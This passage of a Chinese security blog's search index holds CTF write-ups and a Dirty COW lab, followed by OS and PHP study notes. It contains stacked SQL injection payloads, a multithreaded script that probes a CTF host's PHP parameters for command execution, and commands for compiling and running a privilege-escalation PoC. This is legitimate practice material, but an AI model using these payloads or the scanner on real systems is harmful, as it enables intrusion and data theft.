Udc13VD5adM_c10nPxFu@v12\n\n直接访问flag路由看看有什么玄机，回复了一个\n&#123;\"msg\":\"对不起，您不是幸运玩家！\"&#125;\n\n所以应该是要利用SecKey来伪造身份。看大佬说这个是go语言的web框架，所以就找一下相关的session伪造工具，有一个secure-cookie-faker工具，可以伪造golang seesion：https://github.com/EddieIvan01/secure-cookie-faker\n\n\n\nDDCTF{H4v3FuNTh3Game23333!}\n","slug":"DDCTF复现","date":"2020-09-07T09:31:43.000Z","categories_index":"","tags_index":"WEB,DDCTF,Misc","author_index":"A1andNS"},{"id":"75154bd054299764fe262b75fa02cffa","title":"强网杯2019web","content":"日常刷题时间，写一下强网杯2019的web题。\n0x01 随便注上来就让你任意注入，并且在html注释里告诉你sqlmap没有灵魂～.～\n试一下加一个&#39;，报错啦！可以看到报错内容是’’1’’’所以基本就可以判断出查询语句中，用户输入放的位置，在&#39;&#39; &#39;&#39;之间。\n\n试一下1&#39;/**/and/**/1=2%23，可以看到没有任何查询信息。所以直接看看能不能得到列数。\n\n使用order by来查询，可以查询到列数为2,接着试着使用union select，结果发现被过滤啦，并且返回了过滤语句。\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);\n\n可以看出它过滤啦select、update、delete、drop、insert、where、.，而且不区分大小写的匹配大小写绕过是没戏啦，重写也不用试了，看着语句基本就是匹配到就换回值做处理，而不是普通的把关键值置换为空。这里肯定不能在用联合查询的办法啦。上网找绕过的办法，试了一下uni&lt;&gt;on se&lt;&gt;lect 1,2的方法，可是并没有什么效果，看来要用堆叠注啦。\npayload:-1%27;show+databases;%23\n由此可以查询到数据库名称有ctftraining、information_schema、mysql、performance_schema、supersqli、test ，这里头看起来有点意思的看你是ctftraining、supersqli以及test，先看看supersqli吧！\n\npayload:-1%27;use+supersqli;show+tables;%23\n可以看到有两张表，一个1919810931114514开头的，一个words，看一看1919810931114514\n\npayload:-1’;use+supersqli;show+columns+from+`1919810931114514`;#\n在列中看到啦flag列，爆它。\n\npayload:1’;handler `1919810931114514` open;handler `1919810931114514` read first;#\n\nhandler语句的语法如下：\nHANDLER tbl_name OPEN [ [AS] alias]\nHANDLER tbl_name READ index_name &#123; = | &lt;= | >= | &lt; | > &#125; (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ &#123; FIRST | NEXT &#125;\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name CLOSE\n\n还有一种该表名和列名的办法，但是我最终没有成功，表和列都改成了，但是直接查1没有回显内容。\n0x02 高明的黑客一上来就提示，源码泄漏，直接下载至本地\n但是事情并没有这么简单，源码包里的php文件有2000多个，肯定有问题。\n以下是某位大佬的脚本，存一下学习一下。\nimport requests\nimport os\nimport re\nimport threading\nimport time\n\nrequests.adapters.DEFAULT_RETRIES = 8 #设置重连次数，防止线程数过高，断开连接\nsession = requests.Session()\nsession.keep_alive = False # 设置连接活跃状态为False\n\nsem=threading.Semaphore(30) # 设置最大线程数 ,别设置太大，不然还是会崩的挺厉害的，跑到关键的爆炸，心态就爆炸了\n\nurl = \"http://627c82eb-be3f-47e3-900c-6f0312281861.node3.buuoj.cn/\"\n\n# 下载的源文件路径,根据自己的路径修改\npath = r\"/home/a1andns/Downloads/src/\"\n\n\nrrGET = re.compile(r\"\\$_GET\\[\\'(\\w+)\\'\\]\") #匹配get参数\n\nrrPOST = re.compile(r\"\\$_POST\\[\\'(\\w+)\\'\\]\") #匹配post参数\n\nfileNames = os.listdir(path) # 列出目录中的文件,以每个文件都开一个线程\n\n\nlocal_file = open(\"flag.txt\",\"w\",encoding=\"utf-8\")\n\ndef run(fileName):\n\twith sem:\n\t\tfile = open( path + fileName, 'r',encoding='utf-8' )\n\t\tcontent = file.read()\n\t\tprint(\"[+]checking:%s\" % fileName )\n\t\t#测试get的参数\n\t\tfor i in rrGET.findall(content):\n\t\t\tr = session.get( url + \"%s?%s=%s\" % (fileName,i,\"echo ~h3zh1~;\") )\n\t\t\tif \"~h3zh1~\" in r.text:\n\t\t\t\tflag = \"You Find it in GET fileName = %s and param = %s \\n\" % ( fileName, i )\n\t\t\t\tprint(flag)\n\t\t\t\tlocal_file.write(flag)\n\t\t#测试post的参数\n\t\t#for i in rrPOST.findall(content):\n\t\t#\tr = session.post( url + fileName , data = &#123; i : \"echo ~h3zh1~;\" &#125; )\n\t\t#\tif \"~h3zh1~\" in r.text:\n\t\t#\t\tflag = \"You Find it in POST: fileName = %s and param = %s \\n\" % ( fileName, i )\n\t\t#\t\tprint(flag)\n\t\t#\t\tlocal_file.writelines(flag)\nif __name__ == '__main__':\n\tstart_time = time.time() # 开始时间\n\tprint(\"[start]程序开始:\"+str(start_time))\n\tthread_list = []\n\tfor fileName in fileNames:\n\t\tt = threading.Thread( target=run , args=(fileName,) )\n\t\tthread_list.append(t)\n\tfor t in thread_list:\n\t\tt.start()\n\tfor t in thread_list:\n\t\tt.join()\n\t\t\n\tend_time = time.time()\n\tlocal_file.close()\n\tprint(\"[end]程序结束:用时(秒):\"+str(end_time-start_time))\n\n","slug":"强网杯2019web","date":"2020-09-07T03:39:44.000Z","categories_index":"CTF","tags_index":"WEB,强网杯","author_index":"A1andNS"},{"id":"5d0069340c1ad3e5a9c0238a6c992be8","title":"操作系统简介","content":"学校操作系统教的好像比较迟，我先跑了。\n什么是操作系统操作系统就是一类负责让程序运行变容易，允许程序共享内存，让程序能够与设备交互，以及其他类型的又去工作的软件。因为操作系统主要利用一种通用的虚拟化技术，所以我们也经常称操作系统为虚拟机，操作系统也经常实现多程序运行和通知访问自己的指令和数据，所以又把操作系统成为资源管理器。\n虚拟化CPU操作系统负责提供一种效果，让系统拥有很多的虚拟CPU的效果，将单个CPU转换为看似无限数量的CPU，从而让许多程序看似同时运行，这就是所谓的虚拟化CPU。\n虚拟化内存每一个进程都访问自己的私有虚拟地址空间，操作系统一某种方式映射到机器的物理内存上。一个正在运行的程序中的内存引用不会影响其他进程的地址空间。对于正在运行的程序，他完全拥有自己的物理内存，当其实物理内存是操作系统管理的共享资源，把内存进行了虚拟化。\n并发一个递增计数器，同时运行连个线程，当两个线程结束时，计数器的最终只为2N（N为运行运行次数），因为每个线程将计数增加了1000次，当当N值较大时，很多时候计数器最后的结果不会是2N，这和指令如何执行有关，指令每次执行一条，增加计数器的地方，它需要三条指令：一条将计数器的值从内存中加载到寄存器，一条将其递增，一条将其保存回内存中。因为这三条指令不是以原子方式执行的，所以就会出现这种现象。\n持久性出于性能原因，很多文件系统回延迟这些写操作一段时间，希望将其批量分组为较大的组。为了处理写入期间系统崩溃的问题，大多数文件系统都包含某种复杂的写入协议，如日志和copy-to-write，仔细排序写入磁盘的操作，以确保如果在写入序列期间发生故障，系统可以在之后恢复到合理的状态。为了使不同的通用操作系统更加高效，文件系统采用了很多不同的数据结构好访问方法，从简单的列表到复杂的B树。\n操作系统设计目标操作系统实际上，取得CPU、内存或磁盘等物理资源，并对它们进行虚拟化。它处理与并发有关的麻烦且棘手的问题。它持久地存储文件，从而使它们长期安全。\nUNIX操作系统对于操作系统的发展起到了重要的作用。如今的Apple公司的macOS X系统就是基于UNIX系统，Linux也是慢慢Linus从UNIX中慢慢发展来的。包括今天Mobile端最热门的Android系统也是使用的Linux内核。\n如今市面上的常见操作系统就是macOS、Windows、Linux、Unix、Android、iOS等。这其中大多基本都和UNIX有一些小关系。UNIX对于操作系统发展的重要地位不可否认。\n","slug":"操作系统简介","date":"2020-09-06T07:22:52.000Z","categories_index":"操作系统","tags_index":"操作系统","author_index":"A1andNS"},{"id":"6dd91781970153ec4199ae8f8830b41e","title":"CVE-2016-5195(脏牛)内核提权漏洞分析","content":"实验目的\n了解Linux内核提权漏洞原理\n掌握检测修复脏牛漏洞技术\n\n实验内容为什么这个漏洞叫脏牛（Dirty COW）漏洞？Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。\n一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞\n漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权\n影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。\n360 Vulpecker Team：Android 7.0最新的2016年10月补丁安全级别的系统上测试过漏洞POC，确认Android受影响\n实验环境\n实验平台：i春秋平台\n\n操作机：Ubuntu\n\n\n实验工具\ngcc：linux系统下的编译器,用于编译程序\ndirtyc0w.c：本次实验漏洞验证的POC源码\n\n实验步骤步骤1：编译POC打开实验机器，输入帐号ichunqiu密码ichunqiu登录到系统；\n使用ls（查看当前目录文件）命令可以看到POC源码文件dirtyc0w.c。\n当前ichunqiu账户是普通用户操作权限。\n\n可以看到当前账户为ichunqiu，属于普通账户，这里的ubuntu是14.04.1，Linux内核版本为3.19\ngcc -pthread dirtyc0w.c -o dirtyc0w\n\n\n\n\n\n\n\n\n\n\n说明：可见编译选项中指定-pthread 会附加一个宏定义 -D_REENTRANT该宏会导致 libc 头文件选择那些thread-safe的实现。\n步骤2：验证漏洞执行以下命令进行将www.ichunqiu.com字符串保存到`foo`文件内。\necho a1andns.github.io &gt; a1andns\n\n\n\n\n\n\n\n\n\n 如果测试写入文件，没有r也就是读取权限，就会导致POC执行失败。因为该漏洞是利用系统处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，越权写入文件内容。\n来配置文件权限，设置为 0404 （Linux八进制对权限控制的定义写法），0404代表所有用户默认情况下对改文件只有读取权限，无法修改删除。\nchmod 0404 a1andns\n接下来可以准备测试POC越权写文件效果了。\n ./dirtyc0w foo m00000000000000\n执行dirtyc0w文件 foo 是文件名参数 m00000...为利用漏洞写入的值。\n\n下面看看是否写入了数据\n\n果然写入了进去。\n由此POC执行结果就可以判断该系统存在CVE-2016-5195（脏牛）内核提权漏洞。\n分析与思考\nLinux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。\n一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致某些Linux版本提权漏洞。\n低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取Root权限。\n该漏洞影响所有目前运行Linux系统的设备，包含但不限于运行Linux系统的服务器，Docker容器/手机/路由器/智能设备等。\nLinux写时拷贝技术(copy-on-write)\n\n在Linux程序中，fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程\n\n竞态条件\n\n竞态条件（race condition）是指设备或系统出现不恰当的执行时序，而得到不正确的结果。\n\nlinux内存管理–缺页异常处理\n触发异常的线性地址处于用户空间的vma中，但还未分配物理页，如果访问权限OK的话内核就给进程分配相应的物理页。\n触发异常的线性地址不处于用户空间的vma中，这种情况得判断是不是因为用户进程的栈空间消耗完而触发的缺页异常。\n如果 是的话则在用户空间对栈区域进行扩展，并且分配相应的物理页，如果不是则作为一次非法地址访问来处理，内核将终结进程\n\n缺页中断\n缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。在这个时候，被内存映射的文件实际上成了一个分页交换文件。\n\n\n修复方案\n更新最新Linux Kernel源码，并重新编译，也可直接升级最新版本。\n\n\n修复相关代码\n\nhttps://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/？id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619\n\n\n免重启热修补\n代码如下：\n probe kernel.function(&amp;quot;sys_madvise&amp;quot;) &#123;\n    if ($behavior == 4) &#123; $behavior = 0 &#125;\n&#125;\n\nUbuntu系统修复安装SystemTap相关步骤：\napt-get install gcc systemtap\n\nddeb_filename=$(dpkg-query --show --showformat='$&#123;Package&#125;-dbgsym_$&#123;Version&#125;_$&#123;Architecture&#125;.ddeb' linux-image-$(uname -r))\n\nwget http://ddebs.ubuntu.com/pool/main/l/linux/$&#123;ddeb_filename&#125;\n\ndpkg -i $&#123;ddeb_filename&#125;\n\n测试SystemTap安装成功：\nstap -e 'probe begin &#123; print(&amp;quot;hello world\\n&amp;quot;); exit(); &#125;'\n\n执行热修补\nstap -Fge 'probe kernel.function(&amp;quot;sys_madvise&amp;quot;) &#123; if ($behavior == 4) &#123; $behavior = 0 &#125;&#125;'\n\nDisconnecting from systemtap module.\nTo reconnect, type &amp;quot;staprun -A stap_9f8ce8307eb418da7c981b3223eec678_12644&amp;quot;\n\n\n修补完成\nlsmod | grep stap\nstap_9f8ce8307eb418da7c981b3223eec678_12644    81920  0\n\n可以看到 SystemTap 编译出的内核模块已经成功加载。\n参考资料https://www.ichunqiu.com/experiment/detail?id=100258&amp;source=2\n","slug":"CVE-2016-5195-脏牛-内核提权漏洞分析","date":"2020-09-06T01:01:27.000Z","categories_index":"权限提升","tags_index":"漏洞复现,权限提升,漏洞分析","author_index":"A1andNS"},{"id":"b2b1874642f5ccef369c939a5b309ee0","title":"PHP学习(七)","content":"PHP命名空间PHP 命名空间可以解决以下两类问题：\n\n用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。\n为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。\n\n定义命名空间命名空间通过关键字namespace 来声明。如果一个文件中包含命名空间，它必须在其它所有代码之前声明命名空间。语法格式如下；\n&lt;?php  \n// 定义代码在 'MyProject' 命名空间中  \nnamespace MyProject;  \n \n// ... 代码 ...  \n\n也可以定义不同的命名空间代码：\n&lt;?php\n    namespace MyProject&#123;\n\t\n\tconst CONNETC_OK = 1;\n\tclass Connection&#123;/**/&#125;\n\t&#125;\n\tnamespace AnotherProject&#123;\n\n\tconst CONNETC_OK = 1;\n\tclass Connect()&#123;/**/&#125;\n\tfunction connect()&#123;/**/&#125;\n    &#125;\n?>\n\n全局命名空间用:\nnamespace &#123;//全局代码\n    //code\n&#125;\n\n在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的declare语句，所有非PHP代码包括空白符都不能出现在命名空间的声明之前。\n子命名空间&lt;?php\n    namespace MyProject\\Sub\\Level;\n\n\tconst CONNETC_OK = 1;\n\tclass Connection &#123;/**/&#125;\n\tfunction Connect()&#123;/**/&#125;\n?>\n\n创建了常量MyProject\\Sub\\Level\\CONNNECT_OK，类MyProject\\Sub\\Level\\Connnection和函数MyProject\\Sub\\Level\\Connect\n用菜鸟教程里的一个实例很容易就理解了：\nfile1.php 文件代码\n&lt;?php\nnamespace Foo\\Bar\\subnamespace; \n\nconst FOO = 1;\nfunction foo() &#123;&#125;\nclass foo\n&#123;\n    static function staticmethod() &#123;&#125;\n&#125;\n?>\n\nfile2.php 文件代码\n&lt;?php\nnamespace Foo\\Bar;\ninclude 'file1.php';\n\nconst FOO = 2;\nfunction foo() &#123;&#125;\nclass foo\n&#123;\n    static function staticmethod() &#123;&#125;\n&#125;\n\n/* 非限定名称 */\nfoo(); // 解析为函数 Foo\\Bar\\foo\nfoo::staticmethod(); // 解析为类 Foo\\Bar\\foo ，方法为 staticmethod\necho FOO; // 解析为常量 Foo\\Bar\\FOO\n\n/* 限定名称 */\nsubnamespace\\foo(); // 解析为函数 Foo\\Bar\\subnamespace\\foo\nsubnamespace\\foo::staticmethod(); // 解析为类 Foo\\Bar\\subnamespace\\foo,\n                                  // 以及类的方法 staticmethod\necho subnamespace\\FOO; // 解析为常量 Foo\\Bar\\subnamespace\\FOO\n                                  \n/* 完全限定名称 */\n\\Foo\\Bar\\foo(); // 解析为函数 Foo\\Bar\\foo\n\\Foo\\Bar\\foo::staticmethod(); // 解析为类 Foo\\Bar\\foo, 以及类的方法 staticmethod\necho \\Foo\\Bar\\FOO; // 解析为常量 Foo\\Bar\\FOO\n?>\n\n可以看出来限定名称有点相对路径的意思，而完全限定名称则是绝对路径。非限定就是就近原则了，在那个namespace中就默认那个。\n在命名空间内部访问全局类、函数和常量：\n&lt;?php\nnamespace Foo;\n\nfunction strlen() &#123;&#125;\nconst INI_ALL = 3;\nclass Exception &#123;&#125;\n\n$a = \\strlen('hi'); // 调用全局函数strlen\n$b = \\INI_ALL; // 访问全局常量 INI_ALL\n$c = new \\Exception('error'); // 实例化全局类 Exception\n?>\n\nnamespace关键字和__NAMESPACE__常量PHP支持两种抽象的访问当前命名空间内部元素的方法，__NAMESPACE__魔术常量和namespace关键字。常量__NAMESPACE__的值是包含当前命名空间名称的字符串。在全局的，不包括在任何命名空间中的代码，它包含一个空的字符串。\n//命名空间中的代码\n&lt;?php\n    namespace MyProject;\n\t\n\techo __NAMESPACE__;\n?>\n\n//全局代码\n&lt;?php\n    echo __NAMESPACE__;\n?>\n\nPHP面向对象\n类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。\n对象 − 是类的实例。\n成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。\n成员函数 − 定义在类的内部，可用于访问对象的数据。\n继承 − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。\n父类 − 一个类被其他类继承，可将该类称为父类，或基类，或超类。\n子类 − 一个类继承其他类称为子类，也可称为派生类。\n多态 − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。\n重载 − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。\n抽象性 − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。\n封装 − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。\n构造函数 − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。\n析构函数 − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。\n\nPHP 类定义PHP 定义类通常语法格式如下：\n&lt;?php\nclass phpClass &#123;\n  var $var1;\n  var $var2 = \"constant string\";\n  \n  function myfunc ($arg1, $arg2) &#123;\n     [..]\n  &#125;\n  [..]\n&#125;\n?>\n\nPHP 构造函数构造函数是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，在创建对象的语句中与 new 运算符一起使用。\nPHP 5 允许开发者在一个类中定义一个方法作为构造函数，语法格式如下：\nvoid __construct ([ mixed $args [, $... ]] )\n\n在上面的例子中我们就可以通过构造方法来初始化 $url 和 $title 变量：\nfunction __construct( $par1, $par2 ) &#123;\n   $this-&gt;url &#x3D; $par1;\n   $this-&gt;title &#x3D; $par2;\n&#125;\n\n这个和java中的构造函数类似，只不过java中直接使用类名作为函数名，这里有专门的__construct()函数。\nPHP析构函数析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。\nvoid __destruct ( void )\n\n实例&lt;?php\nclass MyDestructableClass &#123;\n   function __construct() &#123;\n       print \"构造函数\\n\";\n       $this->name = \"MyDestructableClass\";\n   &#125;\n\n   function __destruct() &#123;\n       print \"销毁 \" . $this->name . \"\\n\";\n   &#125;\n&#125;\n\n$obj = new MyDestructableClass();\n?>\n/*\n构造函数\n销毁 MyDestructableClass\n\n继承PHP 使用关键字 extends 来继承一个类，PHP 不支持多继承，格式如下：\nclass Child extends Parent &#123;\n   // 代码部分\n&#125;\n\n方法重写如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。\n实例中重写了 getUrl 与 getTitle 方法：\nfunction getUrl() &#123;\n   echo $this->url . PHP_EOL;\n   return $this->url;\n&#125;\n   \nfunction getTitle()&#123;\n   echo $this->title . PHP_EOL;\n   return $this->title;\n&#125;\n\n方法重写如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。\n实例中重写了 getUrl 与 getTitle 方法：\nfunction getUrl() &#123;\n   echo $this->url . PHP_EOL;\n   return $this->url;\n&#125;\n   \nfunction getTitle()&#123;\n   echo $this->title . PHP_EOL;\n   return $this->title;\n&#125;\n\n接口使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。\n接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。\n接口中定义的所有方法都必须是公有，这是接口的特性。\n要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。\n面向对象基本都是类似的。\n&lt;?php\n\n// 声明一个'iTemplate'接口\ninterface iTemplate\n&#123;\n    public function setVariable($name, $var);\n    public function getHtml($template);\n&#125;\n\n\n// 实现接口\nclass Template implements iTemplate\n&#123;\n    private $vars = array();\n  \n    public function setVariable($name, $var)\n    &#123;\n        $this->vars[$name] = $var;\n    &#125;\n  \n    public function getHtml($template)\n    &#123;\n        foreach($this->vars as $name => $value) &#123;\n            $template = str_replace('&#123;' . $name . '&#125;', $value, $template);\n        &#125;\n \n        return $template;\n    &#125;\n&#125;\n\n常量可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。\n常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。\n抽象类任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。\n定义为抽象的类不能被实例化。\n被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。\n继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；\n&lt;?php\nabstract class AbstractClass\n&#123;\n    // 我们的抽象方法仅需要定义需要的参数\n    abstract protected function prefixName($name);\n\n&#125;\n\nclass ConcreteClass extends AbstractClass\n&#123;\n\n    // 我们的子类可以定义父类签名中不存在的可选参数\n    public function prefixName($name, $separator = \".\") &#123;\n        if ($name == \"Pacman\") &#123;\n            $prefix = \"Mr\";\n        &#125; elseif ($name == \"Pacwoman\") &#123;\n            $prefix = \"Mrs\";\n        &#125; else &#123;\n            $prefix = \"\";\n        &#125;\n        return \"&#123;$prefix&#125;&#123;$separator&#125; &#123;$name&#125;\";\n    &#125;\n&#125;\n\n$class = new ConcreteClass;\necho $class->prefixName(\"Pacman\"), \"\\n\";\necho $class->prefixName(\"Pacwoman\"), \"\\n\";\n?>\n\nStatic 关键字声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。\n静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。\n由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。\n静态属性不可以由对象通过 -&gt; 操作符来访问。可以用classname::属性来访问\nFinal 关键字PHP 5 新增了一个 final 关键字。如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。\n调用父类构造方法PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() 。\n&lt;?php\nclass BaseClass &#123;\n   function __construct() &#123;\n       print \"BaseClass 类中构造方法\" . PHP_EOL;\n   &#125;\n&#125;\nclass SubClass extends BaseClass &#123;\n   function __construct() &#123;\n       parent::__construct();  // 子类构造方法不能自动调用父类的构造方法\n       print \"SubClass 类中构造方法\" . PHP_EOL;\n   &#125;\n&#125;\nclass OtherSubClass extends BaseClass &#123;\n    // 继承 BaseClass 的构造方法\n&#125;\n\n// 调用 BaseClass 构造方法\n$obj = new BaseClass();\n\n// 调用 BaseClass、SubClass 构造方法\n$obj = new SubClass();\n\n// 调用 BaseClass 构造方法\n$obj = new OtherSubClass();\n?>\n\n执行以上程序，输出结果为：\nBaseClass 类中构造方法\nBaseClass 类中构造方法\nSubClass 类中构造方法\nBaseClass 类中构造方法\n\nPHP中的易错点\nPHP中没有整数除法\n用户定义的函数和语言关键字对大小写不敏感。\n空数组转化为null\n键名将被这样转换：null 转为(空字符串)，true 转为 1，false 转为 0\n\\** 是单引号字符串字面量中的一个特殊情况，它给出了一个单引号字符串字面量中没有插入\\，\\n**\nheaders_list() 函数返回已发送的（或待发送的）响应头部的一个列表，如需确定是否已发送报头，使用 headers_sent() 函数。\n\n","slug":"PHP学习-七","date":"2020-09-03T02:54:29.000Z","categories_index":"PHP","tags_index":"PHP","author_index":"A1andNS"},{"id":"f788d8271a603c16b39ea0a6ab3ddb7a","title":"PHP学习(六)","content":"PHP数组排序PHP - 数组排序函数在本章中，我们将一一介绍下列 PHP 数组排序函数：\n\nsort() - 对数组进行升序排列\nrsort() - 对数组进行降序排列\nasort() - 根据关联数组的值，对数组进行升序排列\nksort() - 根据关联数组的键，对数组进行升序排列\narsort() - 根据关联数组的值，对数组进行降序排列\nkrsort() - 根据关联数组的键，对数组进行降序排列\n\n还是挺好记的，规律在哪里，就是多几个字母。\n用法：函数名(数组名)；例如：sort($array);\nPHP超级全局变量PHP超级全局变量PHP 超级全局变量列表:\n\n$GLOBALS\n$_SERVER\n$_REQUEST\n$_POST\n$_GET\n$_FILES\n$_ENV\n$_COOKIE\n$_SESSION\n\nPHP $GLOBALS$GLOBALS是PHP的一个超级全局变量组，在一个PHP脚本的全部作用域中都可以访问。$GLOBALS是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。\n$x=1;\n$y=2;\nfunction test()\n&#123;\n    $GLOBALS['Z'] = $GLOBALS['x'] + $GLOBALS['y'];\n&#125;\ntest();\necho $Z;\n\nPHP $_SERVER$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。\n下表列出了所有 $_SERVER 变量中的重要元素:\n\n\n\n元素/代码\n描述\n\n\n\n$_SERVER[‘PHP_SELF’]\n当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/test.php/foo.bar 的脚本中使用 $SERVER[‘PHP_SELF’] 将得到 /test.php/foo.bar。__FILE_ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。\n\n\n$_SERVER[‘GATEWAY_INTERFACE’]\n服务器使用的 CGI 规范的版本；例如，”CGI/1.1”。\n\n\n$_SERVER[‘SERVER_ADDR’]\n当前运行脚本所在的服务器的 IP 地址。\n\n\n$_SERVER[‘SERVER_NAME’]\n当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: www.example.com)\n\n\n$_SERVER[‘SERVER_SOFTWARE’]\n服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache/2.2.24)\n\n\n$_SERVER[‘SERVER_PROTOCOL’]\n请求页面时通信协议的名称和版本。例如，”HTTP/1.0”。\n\n\n$_SERVER[‘REQUEST_METHOD’]\n访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。\n\n\n$_SERVER[‘REQUEST_TIME’]\n请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)\n\n\n$_SERVER[‘QUERY_STRING’]\nquery string（查询字符串），如果有的话，通过它进行页面访问。\n\n\n$_SERVER[‘HTTP_ACCEPT’]\n当前请求头中 Accept: 项的内容，如果存在的话。\n\n\n$_SERVER[‘HTTP_ACCEPT_CHARSET’]\n当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。\n\n\n$_SERVER[‘HTTP_HOST’]\n当前请求头中 Host: 项的内容，如果存在的话。\n\n\n$_SERVER[‘HTTP_REFERER’]\n引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)\n\n\n$_SERVER[‘HTTPS’]\n如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。\n\n\n$_SERVER[‘REMOTE_ADDR’]\n浏览当前页面的用户的 IP 地址。\n\n\n$_SERVER[‘REMOTE_HOST’]\n浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。\n\n\n$_SERVER[‘REMOTE_PORT’]\n用户机器上连接到 Web 服务器所使用的端口号。\n\n\n$_SERVER[‘SCRIPT_FILENAME’]\n当前执行脚本的绝对路径。\n\n\n$_SERVER[‘SERVER_ADMIN’]\n该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：&#x73;&#x6f;&#x6d;&#101;&#x6f;&#x6e;&#x65;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#99;&#111;&#109;)\n\n\n$_SERVER[‘SERVER_PORT’]\nWeb 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。\n\n\n$_SERVER[‘SERVER_SIGNATURE’]\n包含了服务器版本和虚拟主机名的字符串。\n\n\n$_SERVER[‘PATH_TRANSLATED’]\n当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。\n\n\n$_SERVER[‘SCRIPT_NAME’]\n包含当前脚本的路径。这在页面需要指向自己时非常有用。FILE 常量包含当前脚本(例如包含文件)的完整路径和文件名。\n\n\n$_SERVER[‘SCRIPT_URI’]\nURI 用来指定要访问的页面。例如 “/index.html”。\n\n\nPHP 